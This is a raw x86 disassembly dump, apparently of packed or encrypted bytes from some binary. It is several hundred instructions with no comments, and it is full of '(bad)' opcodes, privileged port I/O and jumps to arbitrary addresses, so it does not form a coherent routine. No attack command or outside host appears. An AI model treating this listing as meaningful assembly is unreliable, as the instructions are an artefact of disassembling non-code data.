  412c5a:	retf   
  412c5b:	fwait
  412c5c:	jl     0x412cc4
  412c5e:	jbe    0x412bec
  412c60:	ret    
  412c61:	mov    eax,ds:0x9028dc19
  412c66:	mov    DWORD PTR [esp+edi*8+0x2d664009],eax
  412c6d:	scas   al,BYTE PTR es:[edi]
  412c6e:	stos   DWORD PTR es:[edi],eax
  412c6f:	push   eax
  412c70:	sub    eax,0xc873b53
  412c75:	sbb    edi,DWORD PTR [edi+0x26]
  412c78:	xchg   esi,eax
  412c79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c7a:	jle    0x412cc5
  412c7c:	xor    BYTE PTR [esp+edi*2],ch
  412c7f:	aaa    
  412c80:	add    esp,DWORD PTR [edi+0x67]
  412c83:	lahf   
  412c84:	or     ecx,esp
  412c86:	lods   al,BYTE PTR ds:[esi]
  412c87:	or     ebp,ebx
  412c89:	mov    ds:0xc1f1f6e0,al
  412c8e:	xchg   DWORD PTR cs:[esi],esp
  412c91:	in     al,0x59
  412c93:	aad    0x9d
  412c95:	lahf   
  412c96:	adc    al,0x54
  412c98:	fistp  DWORD PTR [edx]
  412c9a:	sub    ecx,edx
  412c9c:	and    DWORD PTR [eax],edi
  412c9e:	out    0x65,eax
  412ca0:	mov    eax,ds:0xf6477567
  412ca5:	cmp    edx,DWORD PTR [edx]
  412ca7:	in     eax,dx
  412ca8:	popa   
  412ca9:	inc    ebx
  412caa:	push   ds
  412cab:	lock hlt 
  412cad:	pusha  
  412cae:	ss nop
  412cb0:	pop    edi
  412cb1:	in     al,dx
  412cb2:	and    DWORD PTR [ecx-0x6f],0xffffffde
  412cb6:	sahf   
  412cb7:	dec    ecx
  412cb8:	and    bl,dh
  412cba:	fldcw  WORD PTR [eax-0x63]
  412cbd:	xlat   BYTE PTR ds:[ebx]
  412cbe:	xor    al,0x65
  412cc0:	jne    0x412ca3
  412cc2:	repz popa 
  412cc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412cc5:	xchg   esi,eax
  412cc6:	sbb    eax,0xdcc42c30
  412ccb:	mov    eax,ds:0x74aad132
  412cd0:	pop    es
  412cd1:	mov    al,bl
  412cd3:	lahf   
  412cd4:	xor    al,0x2f
  412cd6:	mov    esi,0xcba6c28
  412cdb:	add    ah,bl
  412cdd:	push   edx
  412cde:	scas   eax,DWORD PTR es:[edi]
  412cdf:	rcl    BYTE PTR [ebx+0x3f3c6326],0x64
  412ce6:	(bad)  
  412ce7:	pop    ebp
  412ce8:	push   0x6c
  412cea:	(bad)  
  412ceb:	xor    al,0x7a
  412ced:	mov    BYTE PTR [edi],ch
  412cef:	sbb    ecx,esp
  412cf1:	loop   0x412cfc
  412cf3:	addr16 mov si,0x7e56
  412cf8:	mov    ebx,0x9dc0a271
  412cfd:	or     ebp,DWORD PTR [edi-0x11]
  412d00:	jmp    0x315ca439
  412d05:	fwait
  412d06:	cmp    al,BYTE PTR [edi]
  412d08:	fwait
  412d09:	push   ebx
  412d0a:	add    eax,0x8424c6c1
  412d0f:	and    al,0x7c
  412d11:	cmp    ecx,DWORD PTR [eax]
  412d13:	mov    esi,0xbbe01443
  412d18:	push   edx
  412d19:	cmc    
  412d1a:	shl    DWORD PTR [edx-0xe00d8ca],cl
  412d20:	and    DWORD PTR [ecx],0x9dec876b
  412d26:	adc    eax,DWORD PTR [ecx]
  412d28:	out    0x5f,al
  412d2a:	push   edx
  412d2b:	mov    edx,0x298020ae
  412d30:	mov    edx,0xe4cca511
  412d35:	icebp  
  412d36:	aaa    
  412d37:	fadd   QWORD PTR [ebx-0x4092fa9b]
  412d3d:	adc    dh,dh
  412d3f:	xchg   esi,eax
  412d40:	mov    ds:0xdbe74c75,eax
  412d45:	xor    eax,ebp
  412d47:	push   es
  412d48:	mov    edi,0x3da18206
  412d4d:	aas    
  412d4e:	psadbw mm1,QWORD PTR [edi-0x47]
  412d52:	cmp    BYTE PTR [eax-0x4b],0x18
  412d56:	(bad)  
  412d57:	loope  0x412ce8
  412d59:	sbb    eax,0x698868a9
  412d5e:	mov    eax,0xf2403500
  412d63:	pop    ebp
  412d64:	mov    cl,0x60
  412d66:	mov    eax,DWORD PTR [edx+0x1247af9f]
  412d6c:	adc    BYTE PTR [eax+0x43d08070],ah
  412d72:	out    dx,eax
  412d73:	outs   dx,BYTE PTR ds:[esi]
  412d74:	adc    bl,ch
  412d76:	imul   ecx,DWORD PTR [esi+ecx*2-0x62],0x2f
  412d7b:	jo     0x412d6d
  412d7d:	or     eax,0x786d7a51
  412d82:	(bad)  [ebx+0x5e]
  412d85:	sbb    eax,0xf17028b0
  412d8a:	push   esi
  412d8b:	sbb    BYTE PTR [esi-0x56],0xb9
  412d8f:	pop    eax
  412d90:	push   ss
  412d91:	fimul  WORD PTR [esi+ecx*8-0x79]
  412d95:	loopne 0x412d43
  412d97:	les    ebx,FWORD PTR [ecx]
  412d99:	xchg   bh,bh
  412d9b:	lahf   
  412d9c:	(bad)  
  412d9d:	mov    bh,0x4b
  412d9f:	xchg   esi,eax
  412da0:	test   BYTE PTR [ecx-0x59],bl
  412da3:	test   DWORD PTR [edi+ecx*1-0x12],esp
  412da7:	or     al,0xe2
  412da9:	jle    0x412d8b
  412dab:	add    al,0xb8
  412dad:	mov    ch,BYTE PTR ds:0xdbb96660
  412db3:	popa   
  412db4:	push   edi
  412db5:	sub    edx,DWORD PTR [edi+0x2e4e7206]
  412dbb:	xchg   ecx,eax
  412dbc:	rol    BYTE PTR [edi],cl
  412dbe:	sub    BYTE PTR [ecx-0x79764022],ah
  412dc4:	hlt    
  412dc5:	shr    BYTE PTR [ebx+ecx*4+0x1d],cl
  412dc9:	push   ss
  412dca:	xor    DWORD PTR [edx],esi
  412dcc:	jb     0x412db0
  412dce:	add    eax,0x3386fe9d
  412dd3:	pop    edx
  412dd4:	or     ebx,0xffffffc4
  412dd7:	pushf  
  412dd8:	hlt    
  412dd9:	pushf  
  412dda:	jnp    0x412dee
  412ddc:	stos   DWORD PTR es:[edi],eax
  412ddd:	gs pusha 
  412ddf:	stos   DWORD PTR es:[edi],eax
  412de0:	and    dl,BYTE PTR [eax-0x4430dbcc]
  412de6:	mov    cs,esi
  412de8:	add    DWORD PTR [ecx],edx
  412dea:	stos   DWORD PTR es:[edi],eax
  412deb:	cmp    al,0xdd
  412ded:	sahf   
  412dee:	mov    WORD PTR [esi+0x66],?
  412df1:	push   0x273b13e9
  412df6:	sar    BYTE PTR [ebp+esi*2-0x1a1ea3b7],cl
  412dfd:	pop    ebp
  412dfe:	lods   al,BYTE PTR ds:[esi]
  412dff:	xchg   BYTE PTR [esp+edx*4+0x2a],cl
  412e03:	or     eax,0x73972588
  412e08:	xchg   esp,eax
  412e09:	jmp    0x412ddc
  412e0b:	packuswb mm4,QWORD PTR ds:0x1e987cfe
  412e12:	dec    esp
  412e13:	pop    edi
  412e14:	dec    esi
  412e15:	mov    al,ds:0xac38aa85
  412e1a:	or     esp,DWORD PTR [eax]
  412e1c:	push   cs
  412e1d:	mov    ds:0x9bb7c5cd,eax
  412e22:	jno    0x412da6
  412e24:	rcl    BYTE PTR [ebp-0x4c5c4b93],1
  412e2a:	and    edx,ecx
  412e2c:	mov    fs:0x483a743b,eax
  412e32:	sbb    esi,ebx
  412e34:	fsubrp st(2),st
  412e36:	xor    BYTE PTR [ecx],ch
  412e38:	into   
  412e39:	(bad)  
  412e3a:	mov    bl,0x29
  412e3c:	enter  0x9cfa,0x1a
  412e40:	sysenter 
  412e42:	iret   
  412e43:	xor    al,dl
  412e45:	loop   0x412e38
  412e47:	add    DWORD PTR [edi+0x5d86e1fc],ecx
  412e4d:	push   0xeb9cff50
  412e52:	jnp    0x412e3a
  412e54:	xor    edx,DWORD PTR [eax-0x3685d96a]
  412e5a:	test   eax,0x325f8c5a
  412e5f:	je     0x412e93
  412e61:	or     al,0xb5
  412e63:	inc    eax
  412e64:	mov    al,0xfe
  412e66:	cdq    
  412e67:	fwait
  412e68:	enter  0xc5dd,0xda
  412e6c:	call   0x8b8e:0xec09b317
  412e73:	mov    ebp,0xec9025b4
  412e78:	ret    
  412e79:	pop    esi
  412e7a:	lods   eax,DWORD PTR ds:[esi]
  412e7b:	pop    edx
  412e7c:	fstp   QWORD PTR [esi-0x17]
  412e7f:	sub    esp,esi
  412e81:	xchg   esp,eax
  412e82:	push   ss
  412e83:	xchg   DWORD PTR [edx],eax
  412e85:	fisub  WORD PTR [esi+0x12]
  412e88:	mov    dh,0x70
  412e8a:	cmp    BYTE PTR [esi+0x1e3b1c79],0xb6
  412e91:	mov    ecx,0xc157345d
  412e96:	mov    ds:0xb3241fe9,eax
  412e9b:	aas    
  412e9c:	mov    ds:0xbe261dec,al
  412ea1:	in     eax,0xa4
  412ea3:	out    dx,eax
  412ea4:	mov    ebp,DWORD PTR [ecx-0x1f]
  412ea7:	mov    cl,0xda
  412ea9:	adc    dl,0x38
  412eac:	jle    0x412e40
  412eae:	mov    ebp,DWORD PTR [ecx+0x1be06443]
  412eb4:	ja     0x412ed6
  412eb6:	mov    ebp,0x116a1d83
  412ebb:	push   ecx
  412ebc:	jnp    0x412ebc
  412ebe:	xchg   ecx,eax
  412ebf:	mov    dh,0x57
  412ec1:	pop    ebp
  412ec2:	push   ebp
  412ec3:	xchg   BYTE PTR [ebx-0x53d39483],bl
  412ec9:	push   ds
  412eca:	and    DWORD PTR [edi*8+0x4ec62dfc],esi
  412ed1:	jge    0x412f36
  412ed3:	popa   
  412ed4:	fwait
  412ed5:	sub    DWORD PTR [esi-0x2c1504ae],esi
  412edb:	stos   DWORD PTR es:[edi],eax
  412edc:	dec    eax
  412edd:	imul   ebp,DWORD PTR [eax+0x56],0x4acad991
  412ee4:	mov    esp,0xb3ec7c25
  412ee9:	les    esi,FWORD PTR [ecx+0x127ea595]
  412eef:	add    eax,0xc5294b31
  412ef4:	dec    ebx
  412ef5:	push   ecx
  412ef6:	xchg   ebx,eax
  412ef7:	aam    0x40
  412ef9:	clc    
  412efa:	popf   
  412efb:	addr16 sti 
  412efd:	scas   eax,DWORD PTR es:[edi]
  412efe:	(bad)  
  412eff:	fstp   st(0)
  412f01:	gs mov ebp,0xc4a11731
  412f07:	xchg   DWORD PTR [esi+0x200caf88],esi
  412f0d:	inc    edx
  412f0e:	jnp    0x412f73
  412f10:	les    eax,FWORD PTR [ebx-0x7b]
  412f13:	jne    0x412f71
  412f15:	and    BYTE PTR [edi],al
  412f17:	push   0x50
  412f19:	test   al,0xa1
  412f1b:	mov    eax,ds:0x74ca834a
  412f20:	mov    ds:0xdff77e23,eax
  412f25:	retf   0xbc3c
  412f28:	pop    ds
  412f29:	enter  0xab73,0xca
  412f2d:	fidiv  WORD PTR [eax+edi*2+0x688e95e6]
  412f34:	jge    0x412f94
  412f36:	bound  edx,QWORD PTR [edi-0x3a]
  412f39:	aaa    
  412f3a:	push   0x5b
  412f3c:	je     0x412f0e
  412f3e:	xchg   esp,eax
  412f3f:	push   eax
  412f40:	ret    0xb543
  412f43:	neg    DWORD PTR [ebp+0x63]
  412f46:	jg     0x412faa
  412f48:	mov    eax,ds:0x8c678c81
  412f4d:	(bad)  
  412f4f:	div    DWORD PTR [eax-0x5e]
  412f52:	ja     0x412f13
  412f54:	adc    eax,0x661a1902
  412f59:	jg     0x412f36
  412f5b:	ficom  DWORD PTR [esi+ebx*8]
  412f5e:	cwde   
  412f5f:	aaa    
  412f60:	and    eax,0x401d45d3
  412f65:	mov    edx,0x402a5c68
  412f6a:	mov    dh,0x65
  412f6c:	test   al,0xf4
  412f6e:	cmp    edx,DWORD PTR [esi+0x34b4da7a]
  412f74:	push   esi
  412f75:	scas   al,BYTE PTR es:[edi]
  412f76:	mov    esp,0x986241fb
  412f7b:	pop    esi
  412f7c:	xor    al,0xdd
  412f7e:	jae    0x412f08
  412f80:	das    
  412f81:	mov    ecx,0xea44fbe1
  412f86:	cli    
  412f87:	dec    ecx
  412f88:	sbb    edx,ecx
  412f8a:	mov    al,ds:0xe091808a
  412f8f:	adc    DWORD PTR [eax+0x17110c2],ecx
  412f95:	jecxz  0x412fc9
  412f97:	pop    es
  412f98:	jmp    0x412f92
  412f9a:	ror    DWORD PTR [edi-0x26],1
  412f9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f9e:	out    dx,eax
  412f9f:	add    bh,BYTE PTR [ebp-0xd]
  412fa2:	or     bl,BYTE PTR [edi-0x3bdb1d71]
  412fa8:	loopne 0x413017
  412faa:	xchg   esp,eax
  412fab:	les    edi,FWORD PTR ds:0xce8812b4
  412fb1:	jbe    0x412ff8
  412fb3:	jmp    0x62c98721
  412fb8:	js     0x412f63
  412fba:	and    eax,0xfa27ac17
  412fbf:	or     DWORD PTR [ecx-0x3a],ecx
  412fc2:	ins    DWORD PTR es:[edi],dx
  412fc3:	aad    0xf4
  412fc5:	(bad)  
  412fc6:	pusha  
  412fc7:	mov    DWORD PTR [ebp+0x7a555f15],esp
  412fcd:	aas    
  412fce:	loope  0x412f5f
  412fd0:	cs sub dh,dl
  412fd3:	or     al,BYTE PTR [ebp-0x2ef1b750]
  412fd9:	aas    
  412fda:	adc    eax,0x13a7719b
  412fdf:	(bad)  
  412fe0:	dec    eax
  412fe1:	shr    BYTE PTR [ebp+0x7b1a3e40],cl
  412fe7:	pop    edx
  412fe8:	add    al,0x69
  412fea:	jmp    DWORD PTR [edx]
  412fec:	dec    ebx
  412fed:	clc    
  412fee:	ficom  WORD PTR ss:[eax-0x78]
  412ff2:	cmp    al,0x7f
  412ff4:	aaa    
  412ff5:	xor    ah,BYTE PTR [eax-0x701e0aba]
  412ffb:	xchg   ebp,eax
  412ffc:	ror    DWORD PTR [esi+0x19],1
  412fff:	leave  
  413000:	aad    0x8a
  413002:	dec    ecx
  413003:	sbb    BYTE PTR [edx],bh
  413005:	daa    
  413006:	pop    eax
  413007:	ins    BYTE PTR es:[edi],dx
  413008:	push   0xffffffba
  41300a:	mov    edx,0x7b76291b
  41300f:	aad    0x14
  413011:	or     BYTE PTR [ebp+0x1d],dl
  413014:	outs   dx,BYTE PTR ds:[esi]
  413015:	adc    DWORD PTR [ebp-0x64],ebx
  413018:	or     bl,BYTE PTR [edi]
  41301a:	jge    0x412f9f
  41301c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41301d:	dec    edi
  41301e:	sub    eax,0x40ad8c83
  413023:	enter  0x6216,0xdb
  413027:	test   eax,0x800f2451
  41302c:	sbb    DWORD PTR [esi+esi*2],edi
  41302f:	push   edx
  413030:	pop    ebp
  413031:	outs   dx,DWORD PTR ds:[esi]
  413032:	sbb    al,0x9d
  413034:	cs jg  0x413067
  413037:	pusha  
  413038:	outs   dx,BYTE PTR ds:[esi]
  413039:	pop    edi
  41303a:	xchg   esp,eax
  41303b:	outs   dx,BYTE PTR cs:[esi]
  41303d:	and    BYTE PTR [ebx-0x4c],ah
  413040:	shl    DWORD PTR [esp+eiz*4-0x3010bcac],1
  413047:	jae    0x412ff4
  413049:	in     al,dx
  41304a:	gs adc al,0x89
  41304d:	inc    edx
  41304e:	mov    WORD PTR ds:0x15e8964c,ds
  413054:	push   eax
  413055:	mov    dl,0xbb
  413057:	or     eax,edi
  413059:	pop    eax
  41305a:	daa    
  41305b:	and    al,0x81
  41305d:	mov    ah,0x6c
  41305f:	clc    
  413060:	ret    
  413061:	pop    ebx
  413062:	sub    al,0xfe
  413064:	cmp    BYTE PTR [edx+0x55],bh
  413067:	shl    DWORD PTR [edx+0x1b3b0363],1
  41306d:	js     0x412ff8
  41306f:	jp     0x412ffc
  413071:	jno    0x413006
  413073:	jecxz  0x41307c
  413075:	push   0xffffffb2
  413077:	(bad)  
  413078:	mov    dl,BYTE PTR [edi]
  41307a:	gs retf 0xb509
  41307e:	or     BYTE PTR [edi-0x3c],ch
  413081:	aad    0x27
  413083:	aaa    
  413084:	jbe    0x413046
  413086:	inc    edx
  413087:	f2xm1  
  413089:	in     al,dx
  41308a:	dec    esi
  41308b:	lock sub DWORD PTR [ebx-0x45650356],ecx
  413092:	ss ins BYTE PTR es:[edi],dx
  413094:	arpl   si,ax
  413096:	sub    BYTE PTR [ebp+0x61185b85],0x80
  41309d:	shl    eax,cl
  41309f:	(bad)  
  4130a0:	cld    
  4130a1:	or     BYTE PTR [ebx],0xc
  4130a4:	cs pop ebx
  4130a6:	inc    ecx
  4130a7:	jbe    0x4130af
  4130a9:	pop    edi
  4130aa:	pushf  
  4130ab:	lods   eax,DWORD PTR ds:[esi]
  4130ac:	retf   0x1566
  4130af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4130b0:	xchg   edx,eax
  4130b1:	mov    esi,0xcd844c08
  4130b6:	push   0xbd0f897c
  4130bb:	push   edx
  4130bc:	imul   ebp,DWORD PTR [edx+esi*4+0x7f6e752d],0xa4b56f98
  4130c7:	fisubr DWORD PTR [ecx+0x7db2c87c]
  4130cd:	ficomp DWORD PTR [ecx+0xf]
  4130d0:	rep ins BYTE PTR es:[edi],dx
  4130d2:	clc    
  4130d3:	lahf   
  4130d4:	sub    al,0x24
  4130d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4130d7:	aam    0x9f
  4130d9:	(bad)  
  4130da:	jns    0x4130c7
  4130dc:	xchg   esi,ebx
  4130de:	sbb    al,0xf1
  4130e0:	xchg   al,ah
  4130e2:	lods   al,BYTE PTR ds:[esi]
  4130e3:	mov    eax,0x9ab1f806
  4130e8:	cld    
  4130e9:	jmp    0x4130c2
  4130eb:	xchg   ecx,eax
  4130ec:	popf   
  4130ed:	lods   al,BYTE PTR ds:[esi]
  4130ee:	add    BYTE PTR [edx],dl
  4130f0:	in     al,dx
  4130f1:	pop    es
  4130f2:	dec    ecx
  4130f3:	add    eax,DWORD PTR [ecx]
  4130f5:	inc    ebp
  4130f6:	cmp    eax,0x815cf30d
  4130fb:	sub    BYTE PTR [esi+ebp*8],ah
  4130fe:	test   al,0x97
  413100:	call   0x465a2dc0
  413105:	and    al,0xaa
  413107:	stc    
  413108:	sahf   
  413109:	sbb    eax,eax
  41310b:	mov    ds:0x93671607,al
  413110:	xor    ah,dh
  413112:	inc    ecx
  413113:	mov    bl,0xb3
  413115:	mov    eax,ds:0x702890aa
  41311a:	mov    ecx,0x96d0d6a4
  41311f:	(bad)  
  413120:	mov    cl,0x44
  413122:	xchg   ebx,eax
  413123:	or     al,0xb0
  413125:	sgdtd  [eax+0x3]
  413129:	jbe    0x413181
  41312b:	cmc    
  41312c:	cli    
  41312d:	push   eax
  41312e:	jge    0x41318b
  413130:	(bad)  
  413131:	mov    ds:0x32fac1dd,eax
  413136:	imul   eax,DWORD PTR [ecx+0x56],0x7b
  41313a:	jnp    0x413103
  41313c:	add    ah,BYTE PTR [ebx+esi*1+0x2a6d2a08]
  413143:	dec    esp
  413144:	test   edx,eax
  413146:	cmp    DWORD PTR [edi],ecx
  413148:	xor    dh,BYTE PTR [ebx-0x5fa44e2d]
  41314e:	adc    esp,esp
  413150:	push   0x1076b07
  413155:	inc    ecx
  413156:	out    0xce,eax
  413158:	jmp    0x1ba073a
  41315d:	lods   eax,DWORD PTR ds:[esi]
  41315e:	jl     0x4131da
  413160:	ins    DWORD PTR es:[edi],dx
  413161:	dec    ebp
  413162:	les    ecx,FWORD PTR [edx+0x450c14b4]
  413168:	jns    0x413157
  41316a:	leave  
  41316b:	push   eax
  41316c:	arpl   WORD PTR [edx+0x2e248c75],dx
  413172:	xchg   bl,dl
  413174:	rcl    DWORD PTR [ecx+0x587e32bc],cl
  41317a:	and    eax,0xd7fc6a60
  41317f:	dec    ebx
  413180:	sti    
  413181:	imul   edi,DWORD PTR ds:[edx-0x13],0xffffffe1
  413186:	cs mov dl,0x8f
  413189:	sbb    al,0xc2
  41318b:	inc    ebp
  41318c:	mov    ebp,es
  41318e:	ret    0xa7ab
  413191:	ds jo  0x413122
  413194:	loope  0x41317b
  413196:	jge    0x4131fc
  413198:	ins    DWORD PTR es:[edi],dx
  413199:	cmc    
  41319a:	into   
  41319b:	dec    ecx
  41319c:	dec    ebx
  41319d:	dec    edx
  41319e:	and    DWORD PTR [esi],ebx
  4131a0:	mov    cl,0xe1
  4131a2:	and    eax,0xacb24d61
  4131a7:	cmp    DWORD PTR [eax],ebx
  4131a9:	js     0x413161
  4131ab:	inc    esi
  4131ac:	lods   al,BYTE PTR ds:[esi]
  4131ad:	and    dl,BYTE PTR [ebx+0x70]
  4131b0:	test   al,0xce
  4131b2:	addr16 test cl,dh
  4131b5:	int3   
  4131b6:	sbb    DWORD PTR [ecx+0x30e522e1],eax
  4131bc:	mov    ss,WORD PTR [ebp-0x6b]
  4131bf:	aad    0xdd
  4131c1:	and    bl,ah
  4131c3:	shl    DWORD PTR [edx],cl
  4131c5:	pop    ebp
  4131c6:	hlt    
  4131c7:	mov    dl,0x96
  4131c9:	sbb    DWORD PTR [edx-0x548be95e],ebx
  4131cf:	inc    esp
  4131d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4131d1:	inc    edx
  4131d2:	pushf  
  4131d3:	adc    eax,0x5bf9abd7
  4131d8:	inc    eax
  4131d9:	sbb    esp,DWORD PTR [esi]
  4131db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4131dc:	xchg   esp,eax
  4131dd:	test   al,0x14
  4131df:	push   ds
  4131e0:	cmp    BYTE PTR [ebx-0x54],0x1a
  4131e4:	mov    DWORD PTR [eax+0x77f9b7cf],0x18128027
  4131ee:	xor    al,0x9d
  4131f0:	pusha  
  4131f1:	cmc    
  4131f2:	cmp    BYTE PTR [edx-0xa],al
  4131f5:	xor    eax,0xcacf57d8
  4131fa:	xchg   edx,eax
  4131fb:	sbb    BYTE PTR [ebp-0x52fec1c9],al
  413201:	sti    
  413202:	push   esp
  413203:	mov    cl,0xf7
  413205:	adc    eax,0x4c4a236f
  41320a:	enter  0x456e,0x42
  41320e:	stos   DWORD PTR es:[edi],eax
  41320f:	neg    BYTE PTR [edx-0x104f94b0]
  413215:	imul   DWORD PTR [edx-0x791ccd03]
  41321b:	sti    
  41321c:	pusha  
  41321d:	xor    edi,DWORD PTR [esi]
  41321f:	adc    al,BYTE PTR [edx]
  413221:	xor    edi,DWORD PTR [edi]
  413223:	in     eax,0x25
  413225:	push   ss
  413226:	das    
  413227:	es pop ss
  413229:	sbb    eax,0x7d7db4
  41322e:	call   0x33de1f8d
  413233:	jnp    0x4131f7
  413235:	and    BYTE PTR [esi],0x31
  413238:	jp     0x4131df
  41323a:	jns    0x413284
  41323c:	xor    al,al
  41323e:	push   ss
  41323f:	icebp  
  413240:	push   ecx
  413241:	jp     0x4131e1
  413243:	dec    edi
  413244:	test   DWORD PTR [esi],ebx
  413246:	sub    DWORD PTR [eax+edx*8+0x71],eax
  41324a:	outs   dx,DWORD PTR ds:[esi]
  41324b:	outs   dx,BYTE PTR ds:[esi]
  41324c:	aam    0xac
  41324e:	sub    ebp,DWORD PTR ds:0xc10bdf04
  413254:	mov    esi,0xaf85ab32
  413259:	inc    edi
  41325a:	ss pop ebp
  41325c:	xchg   ebx,eax
  41325d:	adc    BYTE PTR [ebx+0x142419fb],ah
  413263:	jmp    0xf0eff310
  413268:	push   0xb49528f0
  41326d:	mov    ch,0x61
  41326f:	enter  0x3ee7,0x41
  413273:	sub    BYTE PTR [edi],bh
  413275:	add    BYTE PTR [esi+esi*1+0x1345738b],al
  41327c:	mov    al,0x48
  41327e:	and    ebx,esi
  413280:	xor    eax,0x6c2e77fb
  413285:	jge    0x4132ec
  413287:	(bad)  
  413288:	pop    ecx
  413289:	xchg   ecx,eax
  41328a:	out    dx,al
  41328b:	xchg   BYTE PTR [esi],ch
  41328d:	mov    ebp,0xada172cd
  413292:	test   ch,dl
  413294:	push   ds
  413295:	and    BYTE PTR [ebx-0x55],bh
  413298:	xor    esp,DWORD PTR [ebx+0x7e]
  41329b:	aam    0xed
  41329d:	call   0x19c3c347
  4132a2:	cmp    BYTE PTR [ecx+0xdf89f36],ah
  4132a8:	mov    esp,0xe40b59b6
  4132ad:	leave  
  4132ae:	data16 adc bh,bl
  4132b1:	add    BYTE PTR [esi],ah
  4132b3:	mov    al,ds:0x3e98437c
  4132b8:	cmp    BYTE PTR [ebp+edi*8+0x3d396bc],ah
  4132bf:	cmp    al,0x7a
  4132c1:	cli    
  4132c2:	push   eax
  4132c3:	push   ds
  4132c4:	lahf   
  4132c5:	fs cmp eax,0x28ca092e
  4132cb:	mov    DWORD PTR [esp+eax*4+0xec3a72c],edi
  4132d2:	xor    esp,DWORD PTR [eax]
  4132d4:	jg     0x4132ca
  4132d6:	mov    eax,ds:0xe452dc3b
  4132db:	inc    ecx
  4132dc:	pop    ebx
  4132dd:	and    dh,BYTE PTR [esi+0x45dea95]
  4132e3:	adc    eax,0x2211ba48
  4132e8:	add    DWORD PTR [ecx],edi
  4132ea:	sahf   
  4132eb:	fiadd  WORD PTR [ecx+0x79ce3607]
  4132f1:	jnp    0x41327f
  4132f3:	sbb    ebp,DWORD PTR ds:0x457de2a3
  4132f9:	into   
  4132fa:	(bad)  
  4132fc:	test   DWORD PTR [ebx],esp
  4132fe:	retf   0xa39e
  413301:	aad    0x28
  413303:	mov    ebx,0x2d3fa28
  413308:	call   DWORD PTR [ebx-0x62]
  41330b:	pop    ss
  41330c:	inc    edi
  41330d:	retf   
  41330e:	push   cs
  41330f:	js     0x41336a
  413311:	dec    esp
  413312:	out    0x76,al
  413314:	stc    
  413315:	xor    bl,cl
  413317:	dec    esp
  413318:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413319:	xor    dh,ah
  41331b:	cmp    al,0x44
  41331d:	xchg   ebx,eax
  41331e:	arpl   WORD PTR [esi-0x79b0d3d9],bp
  413324:	jmp    DWORD PTR [esi]
  413326:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413327:	aad    0xfd
  413329:	add    al,0x90
  41332c:	lods   eax,DWORD PTR ds:[esi]
  41332d:	sbb    ah,BYTE PTR [edi+ecx*2-0x47bb8715]
  413334:	mov    edx,0x1e2e39ca
  413339:	jns    0x413358
  41333b:	sub    eax,0x602d71b7
  413340:	jnp    0x413377
  413342:	push   ebx
  413343:	fcmovnu st,st(0)
  413345:	mov    bh,0x63
  413347:	daa    
  413348:	cdq    
  413349:	xor    esi,DWORD PTR [ebx+edx*4-0x2ea49c8c]
  413350:	lods   al,BYTE PTR ds:[esi]
  413351:	jmp    0xc11ff946
  413356:	jns    0x413376
  413358:	and    BYTE PTR [ebx+0x21327726],ah
  41335e:	loopne 0x41331f
  413360:	outs   dx,DWORD PTR ds:[esi]
  413361:	ins    DWORD PTR es:[edi],dx
  413362:	lahf   
  413363:	push   es
  413364:	push   0x26
  413366:	cmp    DWORD PTR [ebp+0x57374cdd],0xa479446a
  413370:	jae    0x4133b6
  413372:	mov    cl,0xdd
  413374:	div    BYTE PTR [edi-0x1620ffa8]
  41337a:	xchg   ebp,eax
  41337b:	(bad)  
  41337c:	cmp    eax,0x745fef17
  413381:	jmp    0xdec:0xa439b0cf
  413388:	ror    esp,1
  41338a:	and    BYTE PTR [eax-0xe],al
  41338d:	mov    ecx,0xd85ad441
  413392:	iret   
  413393:	outs   dx,DWORD PTR ds:[esi]
  413394:	sbb    BYTE PTR [edi],dl
  413396:	scas   al,BYTE PTR es:[edi]
  413397:	sbb    eax,0xfffffff0
  41339a:	mov    eax,0xbd75fe7f
  41339f:	pop    edx
  4133a0:	push   ds
  4133a1:	inc    eax
  4133a2:	add    al,0x2a
  4133a4:	ret    0x3900
  4133a7:	cmp    al,BYTE PTR [edi-0x2]
  4133aa:	jbe    0x413403
  4133ac:	icebp  
  4133ad:	enter  0xb052,0x9c
  4133b1:	xchg   edx,eax
  4133b2:	cdq    
  4133b3:	pushf  
  4133b4:	sbb    al,dl
  4133b6:	xor    edi,DWORD PTR [esi]
  4133b8:	lea    edx,[ecx+0x7a]
  4133bb:	mov    edi,DWORD PTR [edi+0x3e]
  4133be:	mov    edx,0x889a5f1c
  4133c3:	aas    
  4133c4:	push   ds
  4133c5:	inc    ebp
  4133c6:	dec    ecx
  4133c7:	push   edi
  4133c8:	sub    cl,dl
  4133ca:	in     al,0x74
  4133cc:	xchg   edx,eax
  4133cd:	out    dx,al
  4133ce:	pop    esp
  4133cf:	popa   
  4133d0:	not    DWORD PTR [edx-0x2]
  4133d3:	mov    esi,0x45d4e2a3
  4133d8:	adc    al,0xf5
  4133da:	lods   eax,DWORD PTR ds:[esi]
  4133db:	cmp    eax,0xd82a1996
  4133e0:	jns    0x4133df
  4133e2:	test   ch,0xc1
  4133e5:	adc    cl,ah
  4133e7:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  4133e9:	test   al,0x30
  4133eb:	jle    0x4133dd
  4133ed:	fstp   QWORD PTR [esp+ebx*8-0x35035812]
  4133f4:	cs jnp 0x4133cd
  4133f7:	mov    ebp,0xf819fad8
  4133fc:	push   cs
  4133fd:	rol    DWORD PTR [ebx],0x0
  413400:	mov    esi,0xe34231de
  413405:	xor    DWORD PTR [ecx+0x553a5b17],edi
  41340b:	pushf  
  41340c:	xchg   esp,eax
  41340d:	and    esi,DWORD PTR [edx-0x4a558683]
  413413:	mov    ds:0xe3624f87,al
  413418:	pop    edx
  413419:	clc    
  41341a:	push   ebp
  41341b:	and    al,0xe7
  41341d:	es push edi
  41341f:	inc    ebx
  413420:	(bad)  
  413421:	dec    edi
  413422:	cmc    
  413423:	mov    ebp,0x96ff8ee0
  413428:	cmp    al,0x8a
  41342a:	cmc    
  41342b:	stos   BYTE PTR es:[edi],al
  41342c:	add    esi,DWORD PTR [eax]
  41342e:	xchg   ecx,eax
